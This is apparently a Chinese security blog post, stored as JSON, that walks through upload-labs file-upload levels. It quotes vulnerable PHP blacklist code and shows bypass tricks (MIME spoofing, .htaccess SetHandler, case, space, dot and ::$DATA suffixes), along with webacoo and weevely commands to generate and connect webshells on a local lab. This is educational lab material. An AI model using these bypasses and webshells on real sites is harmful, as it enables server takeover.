{"meta":{"title":"栈桥仔","subtitle":"","description":"","author":"zhanqiaozai","url":"https://zhanqiaozai.github.io","root":"/"},"pages":[],"posts":[{"title":"文件上传","slug":"文件上传","date":"2020-04-07T09:08:02.642Z","updated":"2020-04-07T09:07:30.000Z","comments":true,"path":"2020/04/07/文件上传/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"介绍文件上传漏洞 现在web应用程序，上传文件一种常见功能，为了提高效率，允许用户上传图片，视频，头像和许多其他的文件。然而向用户提供的功能越多，web应用受到攻击的风险就越大，如果web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站权限，或者进一步危害服务器 1、为什么文件上传存在漏洞上传文件时，如果服务器代码没有对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件(asp、aspx、php、jsp等格式文件) 2、危害非法用户利用文件上传的恶意脚本控制整个网站，甚至控制服务器，这个恶意脚本文件被称为WebShell，也可以称之为”网页后门”，WebShell具有强大功能，比如查看服务器目录，服务器中的文件，执行系统命令等。 文件上传导致的常见安全问题 上传文件是Web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。 上传文件时Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为； 上传文件时病毒、木马文件、黑客用以诱骗用户或者管理者下载执行。 上传文件是钓鱼图片或为包含了脚本的图片，在某些版本中的浏览器会被作为脚本执行，被用于钓鱼和欺诈 文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件1、上传的文件能被web容器解析并执行，所以文件上传后所在的目录是要在web容器所覆盖的路径 2、用户能够从web上访问这个文件。如果文件上传了，但用户无法通过web访问，或者无法让web容器解析这个脚本，那么也不能称之为漏洞 3、用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功 绕过JS检测验证JS检测绕过上传漏洞常见于用户选择文件上传的场景，如果上传文件的后缀不被允许，则会弹窗告知，此时上传文件的数据包并没有发送到服务器端，只是在客户端浏览器使用JavaScript对数据包进行检测。 有两种方法可以绕过客户端JavaScript的检测 1）使用浏览器的插件，删除检测文件后缀的JS代码，然后上传文件即可绕过。 2）先把上传文件的后缀名改为允许上传的，比如：jpg、png、gif等，绕过JS检测，在用BurpSuite抓包，将原本的jpg文件改回php文件 查看界面 上传php文件看看能否上传，弹出了对话框，这表名验证点在前端，而不是在服务端 代码分析判断了验证点在前端，查看JS判断代码，F12找到判断代码 把代码抠出来整理 123456789101112131415161718192021function checkFile() &#123; var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value; if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123; alert(&quot;请选择要上传的文件!&quot;); return false; &#125; &#x2F;&#x2F;定义允许上传的文件类型 var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;; &#x2F;&#x2F;提取上传文件的类型 var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F;判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123; var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125;&#125; 可以看到，上传之前，通过JS判断一下文件后缀是否为.jpg|.png|.gif,不是就不允许上传 绕过方法对于前端js验证的绕过方法较为简单，我们可以将要上传的php文件改后缀名为jpg|png|gif,绕过js验证后，再用burp更改上传请求。或者浏览器禁用js后进行上传 现将文件名改为可上传格式，使用burp抓包改为php这样就可以绕过了 查看页面，返回空白图片说明成功 查看根目录 使用第二种方法，删除检查源码进行上传 按F12打开源码 删除红线处的内容onsubmit 提交内容，页面返回空白说明正确 查看根目录 可以使用菜刀连接 upload-labs第绕过MIME-Type验证MIME-Type介绍MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型，是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式 原理在客户端上传文件时，通过Burp Suite抓取数据包，当上传一个php格式的文件时，可以看到数据包中的 Content-Type的值是application/octet-stream，而上传jpg格式的文件时，数据包中的Content-Type的值是image/jpeg 如果服务器代码使用过Content-Type的值来判断文件的类型，那么就存在被绕过的可能，因为Content-Type的值使用过客户端传递的，是可以任意修改的，所以当传一个php文件的时候，在Burp Suite中将Content-Type修改为image/jpeg就可以绕过服务端的检测 注意：是通过客户端传递，服务端检测，是服务端检测验证MIME-Type代码分析MIME-Type验证并不是发生在客户端验证，而是发生在服务端验证 // $_FILES表示使用了$_FILES全局数组，主要作用就是进行文件操作，例如文件上传时，使用较多// upload_file是我们上传时的文件，也就是表单当中input-type=file对应有一个name，name属性的值用来接收$_FILES[‘upload_file’]这个文件，来调用第二维可以指定对应的type，来获取上传文件的MIME-Type类型 查看源码分析，使用$_FILE[‘uploda_file’] [‘type’]获取上传文件的MIME-Type类型，其中upload_file是在表中定义的 12345678910111213141516171819$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123;&#x2F;&#x2F; 判断文件类型，只有符合image&#x2F;jpeg或者image&#x2F;png才能成功成功上传 if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload &#x3D; true; &#125; &#x2F;&#x2F;当文件类型不是上面判断的类型就会报错 &#125; else &#123; $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR.&#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; Burp Suite绕过MIME-Type验证使用burp抓包，更改Content-type的值 上传php文件Content-type的值是： 1Content-Type: application&#x2F;octet-stream 需要将Content-Type中的值改为image/jpeg等可以上传的格式 查看页面，页面返回空白，说明上传成功 查看根目录 可以使用菜刀连接 PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize()可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令1cat image.png wbeshell.php &gt; image.php 此时使用getimagesize()就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize()的限制。绕过黑名单验证基于文件后缀名验证介绍对于文件上传模块来说，尽量避免上传可执行的脚本文件。为了防止上传脚本需要设置对应的验证方式。最简单的就是设置文件后缀名验证 基于文件后缀名验证方式的分类： 1、机遇白名单验证：只针对白名单中有的后缀名，文件才能上传成功。 2、基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功 基于黑名单验证代码分析对于黑名单中的后缀名筛选。绕过黑名单可以通过寻找”漏网之鱼”，寻找某些可以被作为脚本执行同行也不再黑名单中 123456789101112131415161718192021222324252627if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; &#x2F;&#x2F; 设置了四个黑名单后缀名 $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;); &#x2F;&#x2F; 接收当前上传的文件名 $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); &#x2F;&#x2F; 接收之后进行并处理 $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空 &#x2F;&#x2F; 进行判断，如果文件名不在$deny_ext这个黑名单当中，进行上传。 if(!in_array($file_ext, $deny_ext)) &#123; &#x2F;&#x2F; 上传之后重命名，命名成跟时间以及随机数相关的内容，这样他就不是原名称，而是全新的名称 if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR. &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR .&#39;&#x2F;&#39;. $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload &#x3D; true; &#125; &#x2F;&#x2F; 如果在黑名单当值，执行else，不允许上传 &#125; else &#123; $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; BurpSuite绕过黑名单验证不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他的任意后缀名的文件，比如说 1.phtml .phps .php4 .php3 这里黑名单也没有过滤.htaccess，所以也可上传.htaccess后缀的文件进行绕过。 注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All1.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。 配置文件http.conf在Apache中如果需要启动.htaccess，必须在http.conf中设置 AllowOverride 默认情况下红框内会出现None，将None修改为All 这里绕过不使用.htaccess但是提前配置好，使用其他的几个没过滤的文件后缀 使用一下其中一个，当然不止这些扩展名，还有很多 1.phtml .phps .php4 .php3 上传php文件使用burp抓包 将shell.php改为shell.phps Forward放行，页面返回空白图片 右键选择复制图片地址在浏览器中打开，成功返回结果 绕过黑名单验证(.htaccess)upload-labs第四关 .htaccess文件介绍htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能 其中.htaccess文件内容： SetHandler application/x-httpd-php 设置当前目录所有文件都是用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当做PHP执行。不符合则报错 配置文件http.conf在Apache中如果需要启动.htaccess，必须在http.conf中设置 AllowOverride 默认情况下红框内会出现None，将None修改为All 审计黑名单过滤代码1234567891011121314151617181920212223if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; &#x2F;&#x2F; 以下为黑名单，不允许的扩展名，对上传进行判定，判定如果在黑名单中，执行下面else，文件不允许上传 $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传!&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 在黑名单中，没有对.htaccess进行过滤，可以直接上传.htaccess来这是使用php解析任意文件。 .htaccess文件内容：SetHandler application/x-httpd-php 制作图片phpinfo探针并上传将SetHandler application/x-httpd-php复制到文本另存为.htaccess 页面进行上传，会返回一个空图片 复制图片链接，打开新的网址，会出现403，会显示 这说明你文件已经上传了，但是你没有权限去访问他 在上传一个图片，图片包含phpinfo探针 使用文本编写php代码 保存为1.jpg进行上传 复制图片地址在浏览器中打开 绕过黑名单验证(大小写绕过)upload-labs第五关 大小写绕过原理Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的 基于黑名单验证的代码分析1234567891011121314151617181920212223242526$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123;&#x2F;&#x2F; 黑名单中也没有大小写，例如：如果输入php会被过滤但是输入PhP就不会被过滤 if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); &#x2F;&#x2F; 过滤不包含大小写过滤 &#x2F;&#x2F; 将上传的文件去空格 $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 直接修改后缀名php上传文件件以上代码发现大P小h大P(PhP)并没有被过滤，直接修改文件后缀名为PhP进行绕过 文件后缀名不一定必须在BurpSutie截断的HTTP请求中修改，可以直接修改文件后缀名进行上传 用burp将后缀改为大写PHP即可 放行查看页面 查看根目录 WebaCoo上传WebshellWebaCoo生成Webshell：webacoo -g -o a.php 上传Webshell 连接Webshell：webacoo -t -u Webshell地址 在kali中使用webacoo新建一个a.php文件 将文件复制到本地文件中，将后缀名改为大小写结合的PhP 上传复制会返回空白图片，复制图片连接，在另一个页面打开这个地址 复制这个地址去kali连接webshell，使用webacoo -t -u “URL”命令 注意：在URL中，因为是从本地copy到kali中的，本地的靶场是127.0.0.1，但在kali中没有127.0.0.1 1webacoo -t -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;a.PhP&quot; 我们需要修改成本地地址打开cmd使用ipconfig查看当前地址，将127.0.0.1改为当前地址，出现这个页面就说明连接成功 使用ipconfig可以查看本地ip等等 绕过黑名单验证(空格绕过)空格绕过原理Winodws系统下，对于文件名中空格会被作为空处理，程序中的监测代码如果不能自动删除空格，这样就可以利用空格绕过黑名单 针对这样的情况需要使用Burpsuite截断HTTP请求之后，修改对应的文件名 添加空格 基于黑名单验证代码分析12345678910111213141516171819202122if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA #这里并没有使用$file_ext&#x3D;trim($file_ext);来进行收尾去空的操作，可以使用空格绕过 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; BurpSuite绕过黑名单验证利用BurpSuite工具截断HTTP请求，对上传的文件名后加空格 上传一个带有一句话木马的文件，使用BurpSuite抓包，加上空格 forward进行放行，返回空白图，复制图片连接，打开新的页面将其复制运行 运行完成后复制地址，打开，成功返回 WebShell生成与上传-g 表示生成 -o 输出到webshell.php 可以使用webacoo生成webshell：webacoo -g -o webshell.php BurpSuite截断HTTP请求 ，修改对应的文件名，添加空格 -t 表示使用终端，链接之后反弹回来的可以执行cmd的终端 -u 表示URL 使用Webacoo连个上传成功地webshell：webacoo -t -u “URL” 使用webacoo生成一个webshell 页面上传并拦截，在文件或加空格绕过 复制图片连接打开新的页面，将地址复制，查看。页面返回空白 win+r打开cmd，查看当前ip，然后将图片地址复制，将其中的127.0.0.1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确 可以使用cmd命令 netstat -an命令式查看所有和本地计算机建立连接的IP 绕过黑名单验证(.号绕过)upload-labs第七关 .号绕过原理Windows系统下，文件后缀名最后一个点会被自动去除 例如：在桌面新建一个1.php. 系统会自动删除最后一个点 基于黑名单验证代码分析123456789101112131415161718192021222324if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); &#x2F;&#x2F; 加入去空格处理，不能使用空格绕过 &#x2F;&#x2F; 但是没有删除deldot这个.号，这样就可以利用Windows特性进行.号绕过 $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); &#x2F;&#x2F; 进行了大小写转换，也不能进行大小写绕过 $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; BurpSuite绕过黑名单验证上传php文件，使用burp抓包，在文件后加上.号，放行 返回空白文档，复制图片地址，在新页面打开 生成并上传webshell1、生成：weevely generate 密码 路径 文件名使用weevely生成webshell 2、上传上传使用burp抓包加.放行 复制图片地址，在新的页面运行 3、连接：weevely shell文件地址 密码 可以使用help查看一下帮助信息 查看其中的一个net_scan端口扫描 使用system_info 绕过黑名单验证(特殊符号)upload-labs第八关 1、特殊符号绕过原理Windows系统下，如果上传的文件名中test.php::$DATA会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析 例如：在windows系统下新建一个文件名为1.php::$DATA的文件，查看效果。但是在Window下新建的文件名中，包含特殊符号不能成功新建 因为在Windows下不能建带有特殊符号的文本，所以在kali中新建 2、基于黑名单验证代码分析12345678910111213141516171819202122232425if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); &#x2F;&#x2F; 去空格，去末尾的点，转换大小写，首尾去空 &#x2F;&#x2F; 并没有黑名单过滤::这个符号和$DATA这个变量(::$DATA) &#x2F;&#x2F; $DATA这个变量是ADS NTFS系统，所具有的一种格式，数据流 $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 如果在Windows下使用1.php::$DATA系统会直接修改为,1.php，去掉::$DATA，因为Windows不支持文件有特殊符号，通过这种方式就可以绕过黑名单检测，以后在检测黑名单时一定要将这个内容去除掉，否则黑名单很容易被绕过。。。当然过滤时不推荐使用黑名单，推荐白名单，毕竟黑名单出现的漏洞太多。 3、直接上传1.php::$DATA上传带有特殊符号的php文件 页面返回空白图片 复制当前图片连接，使用菜刀或者蚁剑连接php脚本，将::$DATA特殊符号删除，进行连接，aaa是当时webshell中设置的密码 成功连接 绕过黑名单验证(路径拼接绕过)1、路径拼接绕过原理在没有对上传的文件进行重命名的请胯下，用户可以自定义文件名并在服务器上传新建，就会造成对应的绕过黑名单 例如： 用户新建 1.php.+空格+. deldot删除最后一个点之后，不再进行删除，trim删除空格，那么最终上传的文件名为1.php.。 利用windows特性自动去除最后一个点，导致上传成功 所谓路径拼接，就是文件名直接拼接到上传的路径当中 2、基于黑名单验证码代码分析1234567891011121314151617181920212223if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; 